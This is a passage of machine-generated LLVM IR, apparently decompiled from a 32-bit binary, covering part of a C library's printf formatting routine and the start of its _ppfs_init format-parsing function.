  store i32 %v6_80512df, i32* %eax.global-to-local, align 4
  %v2_80512e2 = add i32 %v2_80512d2, 1
  %v3_80512e2 = add i32 %v2_80512e2, %v6_80512df
  store i32 %v3_80512e2, i32* @edx, align 4
  br label %dec_label_pc_80512e6

dec_label_pc_80512e6:                             ; preds = %dec_label_pc_80512d2, %dec_label_pc_80512da
  %v0_80512e6 = load i32, i32* @esp, align 4
  %v1_80512e6 = add i32 %v0_80512e6, 24
  %v2_80512e6 = inttoptr i32 %v1_80512e6 to i32*
  %v3_80512e6 = load i32, i32* %v2_80512e6, align 4
  store i32 %v3_80512e6, i32* %eax.global-to-local, align 4
  %v1_80512ea = add i32 %v0_80512e6, 8
  %v2_80512ea = inttoptr i32 %v1_80512ea to i32*
  store i32 0, i32* %v2_80512ea, align 4
  %v0_80512f2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80512f2 = load i32, i32* @edx, align 4
  %v2_80512f2 = sub i32 %v0_80512f2, %v1_80512f2
  %v7_80512f2 = icmp ult i32 %v0_80512f2, %v1_80512f2
  %v12_80512f2 = icmp eq i32 %v2_80512f2, 0
  %v2_80512f4 = or i1 %v7_80512f2, %v12_80512f2
  br i1 %v2_80512f4, label %dec_label_pc_80512fc, label %dec_label_pc_80512f6

dec_label_pc_80512f6:                             ; preds = %dec_label_pc_80512e6
  store i32 %v2_80512f2, i32* %eax.global-to-local, align 4
  %v1_80512f8 = load i32, i32* @esp, align 4
  %v2_80512f8 = add i32 %v1_80512f8, 8
  %v3_80512f8 = inttoptr i32 %v2_80512f8 to i32*
  store i32 %v2_80512f2, i32* %v3_80512f8, align 4
  %v0_8051300.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80512fc

dec_label_pc_80512fc:                             ; preds = %dec_label_pc_80512e6, %dec_label_pc_80512f6
  %v0_8051300 = phi i32 [ %v1_80512f2, %dec_label_pc_80512e6 ], [ %v0_8051300.pre, %dec_label_pc_80512f6 ]
  %v0_80512fc = load i32, i32* @esp, align 4
  %v1_80512fc = add i32 %v0_80512fc, 8
  %v2_80512fc = inttoptr i32 %v1_80512fc to i32*
  %v3_80512fc = load i32, i32* %v2_80512fc, align 4
  store i32 %v3_80512fc, i32* @ecx, align 4
  %v2_8051300 = add i32 %v3_80512fc, %v0_8051300
  store i32 %v2_8051300, i32* %eax.global-to-local, align 4
  %v1_8051303 = inttoptr i32 %v0_80512fc to i32*
  %v2_8051303 = load i32, i32* %v1_8051303, align 4
  %v4_8051303 = add i32 %v2_8051303, %v2_8051300
  store i32 %v4_8051303, i32* %v1_8051303, align 4
  %v0_8051306 = load i32, i32* @esp, align 4
  %v1_8051306 = add i32 %v0_8051306, 7
  %v2_8051306 = inttoptr i32 %v1_8051306 to i8*
  %v3_8051306 = load i8, i8* %v2_8051306, align 1
  %v9_8051306 = icmp eq i8 %v3_8051306, 48
  %v1_805130b = icmp eq i1 %v9_8051306, false
  br i1 %v1_805130b, label %dec_label_pc_8051317, label %dec_label_pc_805130d

dec_label_pc_805130d:                             ; preds = %dec_label_pc_80512fc
  %v0_805130d = load i32, i32* @ebx, align 4
  %v1_805130d = load i32, i32* @ecx, align 4
  %v2_805130d = add i32 %v1_805130d, %v0_805130d
  store i32 %v2_805130d, i32* @ebx, align 4
  %v1_805130f = add i32 %v0_8051306, 8
  %v2_805130f = inttoptr i32 %v1_805130f to i32*
  store i32 0, i32* %v2_805130f, align 4
  %v0_8051317.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051317

dec_label_pc_8051317:                             ; preds = %dec_label_pc_80512fc, %dec_label_pc_805130d
  %v0_805131e = phi i32 [ %v0_8051306, %dec_label_pc_80512fc ], [ %v0_8051317.pre, %dec_label_pc_805130d ]
  %v1_8051317 = add i32 %v0_805131e, 32
  %v2_8051317 = inttoptr i32 %v1_8051317 to i8*
  %v3_8051317 = load i8, i8* %v2_8051317, align 1
  %v4_8051317 = and i8 %v3_8051317, 8
  %v5_8051317 = icmp eq i8 %v4_8051317, 0
  %v1_805131c = icmp eq i1 %v5_8051317, false
  br i1 %v1_805131c, label %dec_label_pc_8051345, label %dec_label_pc_805131e

dec_label_pc_805131e:                             ; preds = %dec_label_pc_8051317
  %v1_805131e = add i32 %v0_805131e, 8
  %v2_805131e = inttoptr i32 %v1_805131e to i32*
  %v3_805131e = load i32, i32* %v2_805131e, align 4
  store i32 %v3_805131e, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_8051327 = add i32 %v0_805131e, 368
  %v2_8051327 = inttoptr i32 %v1_8051327 to i32*
  %v3_8051327 = load i32, i32* %v2_8051327, align 4
  store i32 %v3_8051327, i32* @eax, align 4
  %v0_805132e = call i32 @_charpad()
  store i32 %v0_805132e, i32* %eax.global-to-local, align 4
  %v1_8051333 = load i32, i32* @esp, align 4
  %v2_8051333 = add i32 %v1_8051333, 8
  %v3_8051333 = inttoptr i32 %v2_8051333 to i32*
  %v4_8051333 = load i32, i32* %v3_8051333, align 4
  %v15_8051333 = icmp eq i32 %v0_805132e, %v4_8051333
  %v1_8051337 = icmp eq i1 %v15_8051333, false
  br i1 %v1_8051337, label %dec_label_pc_8051433, label %dec_label_pc_805133d

dec_label_pc_805133d:                             ; preds = %dec_label_pc_805131e
  store i32 0, i32* %v3_8051333, align 4
  %v1_8051345.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051345

dec_label_pc_8051345:                             ; preds = %dec_label_pc_8051317, %dec_label_pc_805133d
  %v1_8051345 = phi i32 [ %v0_805131e, %dec_label_pc_8051317 ], [ %v1_8051345.pre, %dec_label_pc_805133d ]
  %v0_8051345 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051345 = add i32 %v1_8051345, -4
  %v3_8051345 = inttoptr i32 %v2_8051345 to i32*
  store i32 %v0_8051345, i32* %v3_8051345, align 4
  %v0_8051346 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051346 = add i32 %v1_8051345, -8
  %v3_8051346 = inttoptr i32 %v2_8051346 to i32*
  store i32 %v0_8051346, i32* %v3_8051346, align 4
  %v1_8051347 = add i32 %v1_8051345, 368
  %v2_8051347 = inttoptr i32 %v1_8051347 to i32*
  %v3_8051347 = load i32, i32* %v2_8051347, align 4
  %v5_8051347 = add i32 %v1_8051345, -12
  %v6_8051347 = inttoptr i32 %v5_8051347 to i32*
  store i32 %v3_8051347, i32* %v6_8051347, align 4
  %v0_805134e = load i32, i32* @ebp, align 4
  %v1_805134e = add i32 %v0_805134e, ptrtoint (i32* @global_var_8059305.473 to i32)
  store i32 %v1_805134e, i32* %eax.global-to-local, align 4
  %v2_8051354 = add i32 %v1_8051345, -16
  %v3_8051354 = inttoptr i32 %v2_8051354 to i32*
  store i32 %v1_805134e, i32* %v3_8051354, align 4
  %v0_8051355 = load i32, i32* %stack_var_-364, align 4
  %v4_8051355 = inttoptr i32 %v0_8051355 to i8*
  %v5_8051355 = call i32 @__GI_fputs_unlocked(i8* %v4_8051355, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8051355, i32* %eax.global-to-local, align 4
  %v0_805135a = load i32, i32* @esp, align 4
  %v1_805135a = add i32 %v0_805135a, 384
  %v2_805135a = inttoptr i32 %v1_805135a to i32*
  %v3_805135a = load i32, i32* %v2_805135a, align 4
  store i32 %v3_805135a, i32* @eax, align 4
  %v0_8051361 = load i32, i32* @ebx, align 4
  store i32 %v0_8051361, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_8051368 = call i32 @_charpad()
  store i32 %v0_8051368, i32* %eax.global-to-local, align 4
  %v0_805136d = load i32, i32* @esp, align 4
  %v1_805136d = add i32 %v0_805136d, 16
  %v1_8051370 = load i32, i32* @ebx, align 4
  %v12_8051370 = icmp eq i32 %v0_8051368, %v1_8051370
  %v1_8051372 = icmp eq i1 %v12_8051370, false
  br i1 %v1_8051372, label %dec_label_pc_8051433, label %dec_label_pc_8051378

dec_label_pc_8051378:                             ; preds = %dec_label_pc_8051345
  %v1_8051378 = add i32 %v0_805136d, 356
  %v2_8051378 = inttoptr i32 %v1_8051378 to i32*
  %v3_8051378 = load i32, i32* %v2_8051378, align 4
  %v4_8051378 = icmp eq i32 %v3_8051378, 0
  %v1_8051380 = icmp eq i1 %v4_8051378, false
  br i1 %v1_8051380, label %dec_label_pc_80513a4, label %dec_label_pc_8051382

dec_label_pc_8051382:                             ; preds = %dec_label_pc_8051378
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8051384 = load i32, i32* @esi, align 4
  %v1_8051384 = icmp eq i32 %v0_8051384, 0
  br i1 %v1_8051384, label %dec_label_pc_805139a.thread, label %dec_label_pc_805139a

dec_label_pc_805139a.thread:                      ; preds = %dec_label_pc_8051382
  br label %dec_label_pc_8051405

dec_label_pc_805139a:                             ; preds = %dec_label_pc_8051382
  %v2_8051388 = add i32 %v0_805136d, 12
  %v3_8051388 = inttoptr i32 %v2_8051388 to i32*
  store i32 0, i32* %v3_8051388, align 4
  %v1_8051389 = add i32 %v0_805136d, 384
  %v2_8051389 = inttoptr i32 %v1_8051389 to i32*
  %v3_8051389 = load i32, i32* %v2_8051389, align 4
  %v5_8051389 = add i32 %v0_805136d, 8
  %v6_8051389 = inttoptr i32 %v5_8051389 to i32*
  store i32 %v3_8051389, i32* %v6_8051389, align 4
  %v0_8051390 = load i32, i32* @esi, align 4
  %v2_8051390 = add i32 %v0_805136d, 4
  %v3_8051390 = inttoptr i32 %v2_8051390 to i32*
  store i32 %v0_8051390, i32* %v3_8051390, align 4
  %v0_8051391 = load i32, i32* @edi, align 4
  %v3_8051391 = inttoptr i32 %v0_805136d to i32*
  store i32 %v0_8051391, i32* %v3_8051391, align 4
  %v0_8051392 = load i32, i32* %stack_var_-364, align 4
  %v4_8051392 = call i32 @__stdio_fwrite(i32 %v0_8051392, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8051392, i32* %eax.global-to-local, align 4
  %v0_8051397 = load i32, i32* @esp, align 4
  %v1_8051397 = add i32 %v0_8051397, 16
  %v1_805139a.pre = load i32, i32* @esi, align 4
  %v12_805139a = icmp eq i32 %v4_8051392, %v1_805139a.pre
  %v1_805139c = icmp eq i1 %v12_805139a, false
  br i1 %v1_805139c, label %dec_label_pc_8051433, label %dec_label_pc_8051405

dec_label_pc_80513a4:                             ; preds = %dec_label_pc_8051378
  %v1_80513a4 = add i32 %v0_805136d, 348
  %v2_80513a4 = inttoptr i32 %v1_80513a4 to i32*
  store i32 0, i32* %v2_80513a4, align 4
  %v0_80514018 = load i32, i32* @esi, align 4
  %v1_80514019 = icmp eq i32 %v0_80514018, 0
  %v1_805140316 = icmp eq i1 %v1_80514019, false
  br i1 %v1_805140316, label %dec_label_pc_80513b1, label %dec_label_pc_80513a4.dec_label_pc_8051405.loopexit_crit_edge

dec_label_pc_80513a4.dec_label_pc_8051405.loopexit_crit_edge: ; preds = %dec_label_pc_80513a4
  %v0_8051405.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051405

dec_label_pc_80513b1:                             ; preds = %dec_label_pc_80513a4, %dec_label_pc_80513ff
  %v0_80513b1 = phi i32 [ %v2_80513ff, %dec_label_pc_80513ff ], [ %v0_80514018, %dec_label_pc_80513a4 ]
  %tmp103 = icmp ult i32 %v0_80513b1, 129
  br i1 %tmp103, label %dec_label_pc_80513c0, label %dec_label_pc_80513bb

dec_label_pc_80513bb:                             ; preds = %dec_label_pc_80513b1
  br label %dec_label_pc_80513c0

dec_label_pc_80513c0:                             ; preds = %dec_label_pc_80513b1, %dec_label_pc_80513bb
  %storemerge104 = phi i32 [ 128, %dec_label_pc_80513bb ], [ %v0_80513b1, %dec_label_pc_80513b1 ]
  store i32 %storemerge104, i32* %edx.global-to-local, align 4
  %v0_80513c0 = load i32, i32* @esp, align 4
  %v1_80513c0 = add i32 %v0_80513c0, 332
  %v2_80513c7 = add i32 %v0_80513c0, -4
  %v3_80513c7 = inttoptr i32 %v2_80513c7 to i32*
  store i32 %v1_80513c0, i32* %v3_80513c7, align 4
  %v0_80513c8 = load i32, i32* %edx.global-to-local, align 4
  %v2_80513c8 = add i32 %v0_80513c0, -8
  %v3_80513c8 = inttoptr i32 %v2_80513c8 to i32*
  store i32 %v0_80513c8, i32* %v3_80513c8, align 4
  %v1_80513c9 = add i32 %v0_80513c0, 340
  store i32 %v1_80513c9, i32* %eax.global-to-local, align 4
  %v2_80513d0 = add i32 %v0_80513c0, -12
  %v3_80513d0 = inttoptr i32 %v2_80513d0 to i32*
  store i32 %v1_80513c9, i32* %v3_80513d0, align 4
  %v1_80513d1 = add i32 %v0_80513c0, 204
  store i32 %v1_80513d1, i32* @edi, align 4
  %v2_80513d8 = add i32 %v0_80513c0, -16
  %v3_80513d8 = inttoptr i32 %v2_80513d8 to i32*
  store i32 %v1_80513d1, i32* %v3_80513d8, align 4
  %v0_80513d9 = call i32 @__GI_wcsrtombs()
  store i32 %v0_80513d9, i32* @ebx, align 4
  %v0_80513e0 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_80513e5 = icmp eq i32 %v0_80513d9, 0
  br i1 %v1_80513e5, label %dec_label_pc_80513fb, label %dec_label_pc_80513e9

dec_label_pc_80513e9:                             ; preds = %dec_label_pc_80513c0
  %v0_80513e9 = load i32, i32* @ebp, align 4
  %v2_80513e9 = add i32 %v0_80513e0, 12
  %v3_80513e9 = inttoptr i32 %v2_80513e9 to i32*
  store i32 %v0_80513e9, i32* %v3_80513e9, align 4
  %v1_80513ea = add i32 %v0_80513e0, 384
  %v2_80513ea = inttoptr i32 %v1_80513ea to i32*
  %v3_80513ea = load i32, i32* %v2_80513ea, align 4
  %v5_80513ea = add i32 %v0_80513e0, 8
  %v6_80513ea = inttoptr i32 %v5_80513ea to i32*
  store i32 %v3_80513ea, i32* %v6_80513ea, align 4
  %v2_80513f1 = add i32 %v0_80513e0, 4
  %v3_80513f1 = inttoptr i32 %v2_80513f1 to i32*
  store i32 %v0_80513d9, i32* %v3_80513f1, align 4
  %v0_80513f2 = load i32, i32* @edi, align 4
  %v3_80513f2 = inttoptr i32 %v0_80513e0 to i32*
  store i32 %v0_80513f2, i32* %v3_80513f2, align 4
  %v0_80513f3 = load i32, i32* %stack_var_-364, align 4
  %v4_80513f3 = call i32 @__stdio_fwrite(i32 %v0_80513f3, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80513f3, i32* %eax.global-to-local, align 4
  %v0_80513f8 = load i32, i32* @esp, align 4
  br label %dec_label_pc_80513fb

dec_label_pc_80513fb:                             ; preds = %dec_label_pc_80513c0, %dec_label_pc_80513e9
  %v0_805143350.in = phi i32 [ %v0_80513e0, %dec_label_pc_80513c0 ], [ %v0_80513f8, %dec_label_pc_80513e9 ]
  %v1_80513ff = phi i32 [ 0, %dec_label_pc_80513c0 ], [ %v4_80513f3, %dec_label_pc_80513e9 ]
  %v0_805143350 = add i32 %v0_805143350.in, 16
  %v12_80513fb = icmp eq i32 %v1_80513ff, %v0_80513d9
  %v1_80513fd = icmp eq i1 %v12_80513fb, false
  br i1 %v1_80513fd, label %dec_label_pc_8051433, label %dec_label_pc_80513ff

dec_label_pc_80513ff:                             ; preds = %dec_label_pc_80513fb
  %v0_80513ff = load i32, i32* @esi, align 4
  %v2_80513ff = sub i32 %v0_80513ff, %v1_80513ff
  %v12_80513ff = icmp eq i32 %v2_80513ff, 0
  store i32 %v2_80513ff, i32* @esi, align 4
  %v1_8051403 = icmp eq i1 %v12_80513ff, false
  br i1 %v1_8051403, label %dec_label_pc_80513b1, label %dec_label_pc_8051405

dec_label_pc_8051405:                             ; preds = %dec_label_pc_80513ff, %dec_label_pc_805139a.thread, %dec_label_pc_80513a4.dec_label_pc_8051405.loopexit_crit_edge, %dec_label_pc_805139a
  %v0_8051405 = phi i32 [ %v1_8051397, %dec_label_pc_805139a ], [ %v0_8051405.pre.pre, %dec_label_pc_80513a4.dec_label_pc_8051405.loopexit_crit_edge ], [ %v1_805136d, %dec_label_pc_805139a.thread ], [ %v0_805143350, %dec_label_pc_80513ff ]
  %v1_8051405 = add i32 %v0_8051405, 8
  %v2_8051405 = inttoptr i32 %v1_8051405 to i32*
  %v3_8051405 = load i32, i32* %v2_8051405, align 4
  store i32 %v3_8051405, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_805140e = add i32 %v0_8051405, 368
  %v2_805140e = inttoptr i32 %v1_805140e to i32*
  %v3_805140e = load i32, i32* %v2_805140e, align 4
  store i32 %v3_805140e, i32* @eax, align 4
  %v0_8051415 = call i32 @_charpad()
  store i32 %v0_8051415, i32* %eax.global-to-local, align 4
  %v1_805141a = load i32, i32* @esp, align 4
  %v2_805141a = add i32 %v1_805141a, 8
  %v3_805141a = inttoptr i32 %v2_805141a to i32*
  %v4_805141a = load i32, i32* %v3_805141a, align 4
  %v15_805141a = icmp eq i32 %v0_8051415, %v4_805141a
  %v1_805141e = icmp eq i1 %v15_805141a, false
  br i1 %v1_805141e, label %dec_label_pc_8051433, label %dec_label_pc_8051420

dec_label_pc_8051420:                             ; preds = %dec_label_pc_8051405, %dec_label_pc_805119a, %dec_label_pc_8050fc8
  %v0_8051420 = phi i32 [ %v1_805141a, %dec_label_pc_8051405 ], [ %v0_8051420.pre, %dec_label_pc_805119a ], [ %v1_8050fe6, %dec_label_pc_8050fc8 ]
  %v1_8051420 = add i32 %v0_8051420, 16
  %v2_8051420 = inttoptr i32 %v1_8051420 to i32*
  %v3_8051420 = load i32, i32* %v2_8051420, align 4
  store i32 %v3_8051420, i32* @ebx, align 4
  store i32 %v3_8051420, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050f20.backedge

dec_label_pc_805142b:                             ; preds = %dec_label_pc_8050f5e
  %v1_805142b = add i32 %v0_805142b, 2
  store i32 %v1_805142b, i32* @ebx, align 4
  br label %dec_label_pc_8050f20.backedge

dec_label_pc_8051433:                             ; preds = %dec_label_pc_8050f4a, %dec_label_pc_8051405, %dec_label_pc_805139a, %dec_label_pc_8051345, %dec_label_pc_805131e, %dec_label_pc_805128e, %dec_label_pc_8051209, %dec_label_pc_80511dd, %dec_label_pc_8051171, %dec_label_pc_80513fb
  %v0_8051433 = phi i32 [ %v0_805143350, %dec_label_pc_80513fb ], [ %v0_8051433.pre.pre, %dec_label_pc_8050f4a ], [ %v1_805141a, %dec_label_pc_8051405 ], [ %v1_8051397, %dec_label_pc_805139a ], [ %v1_805136d, %dec_label_pc_8051345 ], [ %v1_8051333, %dec_label_pc_805131e ], [ %v0_8050fc0.lcssa, %dec_label_pc_805128e ], [ %v1_8051221, %dec_label_pc_8051209 ], [ %v1_80511f4, %dec_label_pc_80511dd ], [ %v1_805118f, %dec_label_pc_8051171 ]
  %v1_8051433 = inttoptr i32 %v0_8051433 to i32*
  store i32 -1, i32* %v1_8051433, align 4
  br label %dec_label_pc_805143a

dec_label_pc_805143a:                             ; preds = %dec_label_pc_8050f55, %dec_label_pc_8050ec3, %dec_label_pc_8050ee2, %dec_label_pc_8051433
  %v0_805143a = load i32, i32* @esp, align 4
  %v1_805143a = inttoptr i32 %v0_805143a to i32*
  %v2_805143a = load i32, i32* %v1_805143a, align 4
  store i32 %v2_805143a, i32* %eax.global-to-local, align 4
  %v1_805143d = add i32 %v0_805143a, 348
  %v1_8051443 = inttoptr i32 %v1_805143d to i32*
  %v2_8051443 = load i32, i32* %v1_8051443, align 4
  store i32 %v2_8051443, i32* @ebx, align 4
  ret i32 %v2_805143a

; uselistorder directives
  uselistorder i32 %v1_805142b, { 1, 0 }
  uselistorder i32 %v3_8051420, { 2, 3, 0, 1 }
  uselistorder i32 %v0_8051405, { 1, 0 }
  uselistorder i32 %v2_80513ff, { 1, 2, 0 }
  uselistorder i32 %v0_805143350, { 1, 0 }
  uselistorder i32 %v1_80513ff, { 1, 0 }
  uselistorder i32 %v0_80513e0, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v0_805136d, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_8051345, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_805131e, { 0, 2, 1, 3 }
  uselistorder i32 %v2_80512f2, { 1, 0, 2 }
  uselistorder i32 %v6_80512df, { 1, 0 }
  uselistorder i32 %v1_80512dc, { 1, 0 }
  uselistorder i32 %v0_80512d5, { 0, 3, 2, 1 }
  uselistorder i32 %v1_805125f, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_805126f, { 2, 3, 1, 0 }
  uselistorder i32 %v0_80511d0, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v0_80511b6, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v0_805114f, { 1, 0, 2 }
  uselistorder i32 %v1_80510d3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v0_8051126, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_80510af, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8051068, { 1, 0 }
  uselistorder i32 %v1_8051075, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v3_8050fc0, { 3, 10, 11, 5, 4, 7, 6, 8, 12, 0, 1, 2, 13, 9, 14, 15 }
  uselistorder i32 %v0_8050fc0.lcssa, { 0, 8, 7, 6, 9, 24, 23, 12, 13, 14, 15, 16, 17, 11, 10, 19, 18, 22, 21, 20, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_8050fbc, { 1, 0 }
  uselistorder i32 %v1_8050fbc.pre, { 1, 0 }
  uselistorder i32 %v1_8050fbb, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v1_8050fb8, { 1, 0 }
  uselistorder i32 %v2_8050fbc81, { 1, 0 }
  uselistorder i32 %v3_8050fa2, { 1, 0 }
  uselistorder i32 %v1_8050f5e, { 0, 2, 3, 1 }
  uselistorder i32 %v2_8050f2a, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8050f2e, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8050f18, { 1, 0, 2 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 2, 3, 4, 7, 0, 6, 5, 1, 8, 9, 10 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 0, 4, 25, 5, 1, 6, 10, 7, 8, 9, 11, 12, 13, 14, 16, 15, 18, 17, 19, 20, 26, 21, 22, 23, 27, 24, 28, 29, 30, 31 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 52, 54, 55, 56, 57 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 205, { 1, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 -28, { 0, 1, 2, 6, 5, 4, 3, 7, 8, 9, 10 }
  uselistorder i32 204, { 3, 1, 4, 2, 5, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_805143a, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8051433, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_8051405, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_80513fb, { 1, 0 }
  uselistorder label %dec_label_pc_80513c0, { 1, 0 }
  uselistorder label %dec_label_pc_80513b1, { 1, 0 }
  uselistorder label %dec_label_pc_8051345, { 1, 0 }
  uselistorder label %dec_label_pc_8051317, { 1, 0 }
  uselistorder label %dec_label_pc_80512fc, { 1, 0 }
  uselistorder label %dec_label_pc_80512e6, { 1, 0 }
  uselistorder label %dec_label_pc_80512d2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80512c6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805125f, { 1, 0 }
  uselistorder label %dec_label_pc_8051252, { 1, 0 }
  uselistorder label %dec_label_pc_80511dd, { 1, 0 }
  uselistorder label %dec_label_pc_8051171, { 1, 0 }
  uselistorder label %dec_label_pc_8051126, { 1, 0 }
  uselistorder label %dec_label_pc_8051117, { 6, 2, 1, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_80510dd, { 1, 0 }
  uselistorder label %dec_label_pc_80510c4, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8051075, { 1, 0 }
  uselistorder label %dec_label_pc_805105c, { 1, 0 }
  uselistorder label %dec_label_pc_8051048, { 1, 0 }
  uselistorder label %dec_label_pc_8051043, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051024, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050fb1, { 1, 0 }
  uselistorder label %dec_label_pc_8050fa9, { 1, 0 }
  uselistorder label %dec_label_pc_8050f55, { 1, 0 }
  uselistorder label %dec_label_pc_8050f4a, { 1, 0 }
  uselistorder label %dec_label_pc_8050f20.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051448 = load i32, i32* @esi, align 4
  %v0_8051449 = load i32, i32* @ebx, align 4
  store i32 %v0_8051449, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_805145d = bitcast i32* %arg1 to i8*
  %v4_805145d = call i32 @__GI_memset(i8* %v3_805145d, i32 0, i32 188)
  store i32 %v4_805145d, i32* %eax.global-to-local, align 4
  %v0_8051462 = load i32, i32* @ebx, align 4
  %v1_8051462 = add i32 %v0_8051462, 24
  %v2_8051462 = inttoptr i32 %v1_8051462 to i32*
  %v3_8051462 = load i32, i32* %v2_8051462, align 4
  %v4_8051462 = add i32 %v3_8051462, -1
  store i32 %v4_8051462, i32* %v2_8051462, align 4
  %v0_8051465 = load i32, i32* @esi, align 4
  %v1_8051465 = load i32, i32* @ebx, align 4
  %v2_8051465 = inttoptr i32 %v1_8051465 to i32*
  store i32 %v0_8051465, i32* %v2_8051465, align 4
  %v0_8051467 = load i32, i32* @ebx, align 4
  %v1_8051467 = add i32 %v0_8051467, 40
  store i32 %v1_8051467, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051472

dec_label_pc_8051472:                             ; preds = %dec_label_pc_8051472, %entry
  %v0_8051472 = phi i32 [ %v1_8051478, %dec_label_pc_8051472 ], [ %v1_8051467, %entry ]
  %v1_8051472 = inttoptr i32 %v0_8051472 to i32*
  store i32 8, i32* %v1_8051472, align 4
  %v0_8051478 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051478 = add i32 %v0_8051478, 4
  store i32 %v1_8051478, i32* %eax.global-to-local, align 4
  %v0_805147b = load i32, i32* %edx.global-to-local, align 4
  %v1_805147b = add i32 %v0_805147b, -1
  %v8_805147b = icmp eq i32 %v1_805147b, 0
  store i32 %v1_805147b, i32* %edx.global-to-local, align 4
  %v1_805147c = icmp eq i1 %v8_805147b, false
  br i1 %v1_805147c, label %dec_label_pc_8051472, label %dec_label_pc_805147e

dec_label_pc_805147e:                             ; preds = %dec_label_pc_8051472
  %v0_805147e = load i32, i32* @esi, align 4
  store i32 %v0_805147e, i32* %eax.global-to-local, align 4
  %v1_80514a920 = inttoptr i32 %v0_805147e to i8*
  %v2_80514a921 = load i8, i8* %v1_80514a920, align 1
  %v3_80514a922 = zext i8 %v2_80514a921 to i32
  %v5_80514a923 = and i32 %v1_805147b, -256
  %v6_80514a924 = or i32 %v3_80514a922, %v5_80514a923
  store i32 %v6_80514a924, i32* %edx.global-to-local, align 4
  %v4_80514ab25 = icmp eq i8 %v2_80514a921, 0
  %v1_80514ad26 = icmp eq i1 %v4_80514ab25, false
  br i1 %v1_80514ad26, label %dec_label_pc_8051487, label %dec_label_pc_80514af

dec_label_pc_8051487:                             ; preds = %dec_label_pc_805147e, %dec_label_pc_80514a9.backedge
  %v6_80514a929 = phi i32 [ %v6_80514a9, %dec_label_pc_80514a9.backedge ], [ %v6_80514a924, %dec_label_pc_805147e ]
  %v2_80514a928 = phi i8 [ %v2_80514a9, %dec_label_pc_80514a9.backedge ], [ %v2_80514a921, %dec_label_pc_805147e ]
  %v0_805148c27 = phi i32 [ %v0_805148c.be, %dec_label_pc_80514a9.backedge ], [ %v0_805147e, %dec_label_pc_805147e ]
  %v10_8051487 = icmp eq i8 %v2_80514a928, 37
  %v1_805148a = icmp eq i1 %v10_8051487, false
  br i1 %v1_805148a, label %dec_label_pc_80514a8, label %dec_label_pc_805148c

dec_label_pc_805148c:                             ; preds = %dec_label_pc_8051487
  %v1_805148c = add i32 %v0_805148c27, 1
  store i32 %v1_805148c, i32* %eax.global-to-local, align 4
  %v1_805148d = inttoptr i32 %v1_805148c to i8*
  %v2_805148d = load i8, i8* %v1_805148d, align 1
